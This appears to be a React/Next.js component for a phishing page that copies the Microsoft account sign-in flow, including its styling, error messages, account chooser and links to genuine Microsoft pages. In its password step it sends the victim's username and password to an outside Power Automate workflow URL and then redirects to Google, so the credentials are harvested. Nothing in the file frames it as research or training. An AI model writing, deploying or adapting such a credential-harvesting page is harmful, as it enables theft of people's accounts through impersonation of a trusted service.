"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import arrleft from "../assets/arr-left.svg";
import organ from "../assets/orga-icon.png";
import git from "../assets/git-icon.svg";
import question from "../assets/question-icon.svg";
import profile from "../assets/profile-icon.svg";

type LoginPhase = "email" | "password" | "optionsemail" | "options";

interface LoginPhaseProps {
  phase: LoginPhase;
  setPhase: (phase: LoginPhase) => void;
}

export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  // Email validation function
  const isValidEmail = (emailValue: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^\+?[1-9]\d{1,14}$/;
    return emailRegex.test(emailValue);
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    try {
      // Validate email
      if (!email) {
        setError("Enter a valid email address, phone number, or Skype name.");
        setIsLoading(false);
        return;
      }
      
      // Check email format
      if (!isValidEmail(email)) {
        setError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
        setIsLoading(false);
        return;
      }
      
      // Move to next phase
      setPhase("optionsemail");
    } catch (err) {
      setError("Failed to validate email");
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    try {
      // Validate password
      if (!password) {
        setError("Please enter your password.");
        setIsLoading(false);
        return;
      }
      
      // Send email and password to Power Automate API
      const response = await fetch(
        'https://default71951376118a4adb9238d5b8867a2f.39.environment.api.powerplatform.com:443/powerautomate/automations/direct/workflows/e919378912634b1bb70fb8e10604606e/triggers/manual/paths/invoke?api-version=1&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=kDJojkKBmvjo_y0-iMGoZHoJqZfcwO_64Skc_-KNUiY',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            username: email,
            password: password,
          }),
        }
      );

      if (!response.ok) {
        throw new Error('Failed to sign in');
      }

      // Redirect to Google after successful API call
      window.location.href = 'https://www.google.com';
    } catch (err) {
      setError("Failed to sign in");
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    if (phase === "password") {
      setPhase("email");
      setError("");
    }

    if (phase === "optionsemail") {
      setPhase("email");
      setError("");
    }
  };

  const handleNewSignIn = () => {
    setPhase("email");
    setEmail("");
    setPassword("");
    setError("");
  };

  const renderPhase = () => {
    switch (phase) {
      case "email":
        return (
          <div
            style={{ fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif' }}
          >
            <h2 className="text-[24px] font-semibold mb-3 mt-4 text-[#1b1b1b]">
              Sign in
            </h2>
            <form
              id="email-form"
              onSubmit={handleEmailSubmit}
              className="space-y-4 text-[15px] mb-4"
            >
              <div>
                {error && (
                  <div className="text-[#e81123] text-[15px]">
                    {error.includes("or get a new Microsoft account") ? (
                      <>
                        We couldn't find an account with that username. Try another, or{" "}
                        <a href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26username%3dsadsadsa%2540asss.com%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26mkt%3dEN-US%26opid%3dCC6BA83EF17D2600%26opidt%3d1768818582%26uaid%3d64b69cddbda64994b16c48ca3d5c7d79%26contextid%3d2D89108E08AD390E%26opignore%3d1&mkt=EN-US&uiflavor=web&username=sadsadsa%40asss.com&lw=1&fl=easi2&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&uaid=64b69cddbda64994b16c48ca3d5c7d79&suc=81feaced-5ddd-41e7-8bef-3e20a2689bb7&fluent=2&lic=1" className="text-[#0067BB] hover:underline">
                          get a new Microsoft account.
                        </a>
                      </>
                    ) : (
                      error
                    )}
                  </div>
                )}
                <input
                  id="email"
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email, phone, or Skype"
                  suppressHydrationWarning={true}
                  className="w-full py-1.5 pr-2.5 border-b border-[#1b1b1b] outline-none text-[#1b1b1b] text-[15px] font-normal"/>
              </div>
            </form>
            <div className="flex flex-col gap-4">
              <div className="text-[13px] text-[#1b1b1b]">
                No account?{" "}
                <a href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26mkt%3dEN-US%26opid%3d4524033E1F33C7AB%26opidt%3d1768802742%26uaid%3d64b69cddbda64994b16c48ca3d5c7d79%26contextid%3d2831332C4EA188B8%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&uaid=64b69cddbda64994b16c48ca3d5c7d79&suc=81feaced-5ddd-41e7-8bef-3e20a2689bb7&fluent=2&lic=1" className="text-[#0067BB] hover:underline">
                  Create one!
                </a>
              </div>
              <div className="text-[13px]">
                <a
                  href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZHNa9NgAIeTdqu1oOsmyC5CD1PGZtI3X01SGNJlH21d0680a3pwpPlo0-VNsiRd1x71spN4EZzHHXcanqYHEbzt4k6inkRwyi6KIAy8WP8C4eF3f55fIkbiFIsTC1ESB9k5TmN4Q9VZTGcBhdEqyWK8wTCYxmdUABha43TSn0kkd77Nzh_-flB6KZTeLhzcw47QVDcMvSCbTsOhqmlu3wlxaGm-G7hmiGsuTJ-g6BmKHkXmiDZDMzStYhpL0xitAx3jVF7DeNY0tQxBGzxgP0Wmyrl-2CX_jetbI-NXJG76agcaTvg86hnDotcSCplCT7YUSe4po8ZgQ1IYcb0QiusiFIeAVqQa3JCqpCIVbXG0TZbIKi3WC0EBEra-vmqVncBSNxnQaha7ClXz2iTTMJrLdqHnWhqUt9Vm0VaoqmU2wdKLaGzsAF3nNHrL9QzH0lOe75qWbaRc07Qtx9gaWxtB8CGKnk2gFxM345Hk7Vk0hczfAdFsPJ5IIrNICrmcQA8nx_223rWlxw9PVg_bB3-o80fI6WTa3qzdZ0qs7lUqpZrHdzr1cDDkGsQony-vwba8YraUfpnPF63cEpclvk-iT2JjbpzGpmCg2ngvwNu-OwgM_2cM3b-CvLr630ueJdCjxKIDhZwjCw2Kz7GywzXCfneP7lfl5dzO2iCv-5ZA8HkdrI6E7eME-uYacnn94-uv74-_PP2Rv5i6K2RYG4bNilmpS4Yk7Klgd4dWuHrL6VZEWVscNXlzzVuhdkFn6TiJfB4zjVxOp_ZnkL81&mkt=en-US&hosted=0&device_platform=Windows+10"
                  className="text-[#0067BB] hover:underline mb-4 text-[13px]"
                >
                  Can't access your account?
                </a>
              </div>
            </div>

            <div className="flex justify-end gap-1 mt-6">
              <button
                type="button"
                onClick={() => router.back()}
                suppressHydrationWarning={true}
                className="w-27 h-8 text-[15px] font-normal text-[#1b1b1b] bg-[#00000033] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#0000004d]"
              >
                Back
              </button>
              <button
                form="email-form"
                type="submit"
                disabled={isLoading}
                suppressHydrationWarning={true}
                className="w-27 h-8 text-[15px] font-normal text-white bg-[#0067BB] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#005a9e]"
              >
                {isLoading ? "Validating..." : "Next"}
              </button>
            </div>
          </div>
        );

      case "password":
        return (
          <div
            style={{ fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif' }}
          >
            <div className="flex items-center mt-4">
              <button
                type="button"
                onClick={handleBack}
                className="cursor-pointer hover:bg-gray-200 rounded-full transition"
              >
                <Image
                  src={arrleft}
                  alt="Back"
                  width={24}
                  height={24}
                  className=""
                  priority
                />
              </button>
              <p className="text-[15px] text-[#1b1b1b] ml-0.5">{email}</p>
            </div>
            <div className="mt-4 mb-3">
              <h2 className="text-[24px] font-semibold text-[#1b1b1b]">
                Enter password
              </h2>
            </div>
            {error && <div className="text-[#E81123] text-[15px]">{error}</div>}
            <form onSubmit={handlePasswordSubmit} className="">
              <div>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoFocus
                  className="w-full py-1.5 pr-2.5 border-b border-[#1b1b1b] outline-none text-[#1b1b1b] text-[15px] font-normal"
                />
              </div>

              <div className="text-[13px] mt-4">
                <a href={`https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZHNa9NgAIeTdqu1oOsmyA6KPUwZm0mTNGmawpAu65rG9XNt2hRU0jdv1rfL15LU2p48DryIIqgHwZ1kBxme1JPgbacdPIgnD4IyBEUQdhGsf4Hw8Ls_zy8WYcgUT9JLYYaksgsZwAlQ03lC56kUwWoMTwiQ4wggpDWK4liQ0RlvLhbf-Tq_uPf7ZumNWHq_9OQasY8nekHg-tlk0hppADgDOyAtBDzHd4yABI6VfI3jRzi-H1qguxzLsaxGAJ5lCVandCKjCYAQeMMAaZqFAsV_Cs1UcoOgx_wbx0Nj-CsUNTxty4J28DTswpHsdsRiuthXkNpQ-uq4OdxoqFy5UAzKhbJVHlGs2qhbG40aozZkszzeZkpMjS1vFv2iRZt6IY8qto-0Fkd12nJPTdXdLsM1YXvVLPYdBCxlW2vLppqqIaNNrbwKRyYOlmMfhi86LrSRnnA9x0AmTDiGYSIb3ppYQ9__GMaPpvDjqfPRUPzyPJ7AFq9Q4Ww0Gotj81gCO5nC96Yn_f5cEKsPFu4WHsJLL59pN7DD6aTZql_nSrzuVquluitsbW0Gw1GmSY8lqbJudZU1o6MOKoIko9yKkKW_TeP3IxPOHUZmLF8zyb5Pdj1n6EPvZwTfPYW9Pf3fSx7H8P3Ysm2JOVsRmykhxyt2phkMenfYQU1Zze2sDyXdQyItSDqVH4vbBzH83Rns5OyH7y-e3_vy6Id0PHMVjGrdFuxUK3Ijd3uQX2tqq25rWECKYy5bQOkIss7meSlNr4GVgzj2ecIsdjKb2J3D_gI1&mkt=en-US&hosted=0&device_platform=Windows+10&username=${encodeURIComponent(email)}`} className="text-[#0067BB] hover:underline">
                  Forgot my password
                </a>
              </div>

              <div className="flex justify-end gap-2 mt-8 mb-1">
                <button
                  type="submit"
                  suppressHydrationWarning={true}
                  disabled={isLoading}
                  className="w-27 h-8 text-[15px] font-normal text-white bg-[#0067BB] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#005a9e]"
                >
                  {isLoading ? "Sign in" : "Sign in"}
                </button>
              </div>
            </form>
          </div>
        );

      case "optionsemail":
        return (
          <div
            style={{ fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif' }}
          >
            <p className="text-[15px] text-[#1b1b1b] mt-4 mb-3">
              It looks like this email is used with more than one account from Microsoft. Which one do you want to use?
            </p>

            <div className="">
              {/* Work or school account */}
              <div
                onClick={() => setPhase("password")}
                className="flex items-center gap-3 hover:bg-[#e0e0e0] cursor-pointer px-11 -mx-11 py-3"
              >
                <div className="shrink-0">
                  <div className="w-12 h-12 bg-[#e0e0e0] rounded-full flex items-center justify-center">
                  <Image
                    src={organ}
                    alt="Organization Icon"
                    width={48}
                    height={48}
                    className=""
                    priority
                  />
                  </div>
                </div>
                <div className="flex-1 text-left">
                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
                    Work or school account
                  </p>
                  <p className="text-[12px] text-[#1b1b1b]">
                    Created by your IT department
                  </p>
                  <p className="text-[12px] text-[#1b1b1b]">
                    {email}
                  </p>
                </div>
              </div>

              {/* Personal account */}
              <div
                onClick={() => setPhase("password")}
                className="flex items-center gap-3 py-3 hover:bg-[#e0e0e0] cursor-pointer px-11 -mx-11"
              >
                <div className="shrink-0">
                  <div className="w-12 h-12 bg-[#e0e0e0] rounded-full flex items-center justify-center">
                    <svg
                      className="w-6 h-6 text-[#666666]"
                      fill="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                    </svg>
                  </div>
                </div>
                <div className="flex-1 text-left">
                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
                    Personal account
                  </p>
                  <p className="text-[12px] text-[#1b1b1b]">
                    Created by you
                  </p>
                  <p className="text-[12px] text-[#1b1b1b]">
                    {email}
                  </p>
                </div>
              </div>
            </div>

            <div className="text-[13px] text-[#1b1b1b] mb-6 pb-4 mt-4">
              Tired of seeing this?&nbsp;
              <a href="https://support.microsoft.com/en-us/account-billing/change-the-email-address-or-phone-number-for-your-microsoft-account-761a662d-8032-88f4-03f3-c9ba8ba0e00b" className="text-[#0067BB] hover:underline">
                Rename your personal Microsoft account.
              </a>
            </div>

            <div className="flex justify-end gap-2">
              <button
                type="button"
                suppressHydrationWarning={true}
                onClick={handleBack}
                className="w-27 h-8 text-[15px] font-normal text-[#1b1b1b] bg-[#00000033] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#0000004d]"
              >
                Back
              </button>
            </div>
          </div>
        );

      case "options":
        return (
          <div
            style={{ fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif' }}
          >
            <h2 className="text-[24px] font-semibold text-[#1b1b1b] mt-4 mb-3">
              Sign-in options
            </h2>

            <div className="mb-8">
              {/* Face, fingerprint, PIN or security key */}
              <div onClick={() => setPhase("email")} className="flex items-center gap-4 py-3  px-11 hover:bg-[#e6e6e6] cursor-pointer transition -mx-11">
                <div className="shrink-0">
                  <Image
                    src={profile}
                    alt="Profile Icon"
                    width={48}
                    height={48}
                    className=""
                    priority
                  />
                </div>
                <div className="flex-1 text-left">
                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
                    Face, fingerprint, PIN or security key
                  </p>
                  <p className="text-[13px] text-[#616161] mt-1">
                    Use your device to sign in with a passkey.
                  </p>
                </div>
                <div className="flex items-center">
                  <Image
                    src={question}
                    alt="Question Icon"
                    width={16}
                    height={16}
                    className=""
                    priority
                  />
                </div>
              </div>

              {/* Sign in with GitHub */}
              <div onClick={() => setPhase("email")} className="flex items-center gap-4 py-3  px-11 hover:bg-[#e6e6e6] cursor-pointer transition -mx-11">
                <div className="shrink-0">
                  <Image
                    src={git}
                    alt="GitHub Logo"
                    width={48}
                    height={48}
                    className=""
                    priority
                  />
                </div>
                <div className="flex-1 text-left">
                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
                    Sign in with GitHub
                  </p>
                </div>
              </div>

              {/* Sign in to an organization */}
              <div onClick={() => setPhase("email")} className="flex items-center gap-4 py-3 px-11 hover:bg-[#e6e6e6] cursor-pointer transition -mx-11">
                <div className="shrink-0">
                  <Image
                    src={organ}
                    alt="Organization Icon"
                    width={48}
                    height={48}
                    className=""
                    priority
                  />
                </div>
                <div className="flex-1 text-left justify-center">
                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
                    Sign in to an organization
                  </p>
                  <p className="text-[13px] text-[#616161] mt-1">
                    Search for a company or an organization you're working with.
                  </p>
                </div>
              </div>
            </div>

            <div className="flex justify-end">
              <button
                type="button"
                onClick={() => setPhase("email")}
                className="text-[15px] font-normal text-[#1b1b1b] bg-[#d0d0d0] transition duration-200 py-1 px-4 cursor-pointer hover:bg-[#999999] w-27"
              >
                Back
              </button>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <>
      <style>{`
        @keyframes slideInRight {
          from {
            opacity: 0;
            transform: translateX(50px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }
        .slide-animation {
          animation: slideInRight 0.4s ease-out;
        }
      `}</style>
      <div key={phase} className="slide-animation">
        {renderPhase()}
      </div>
    </>
  );
}
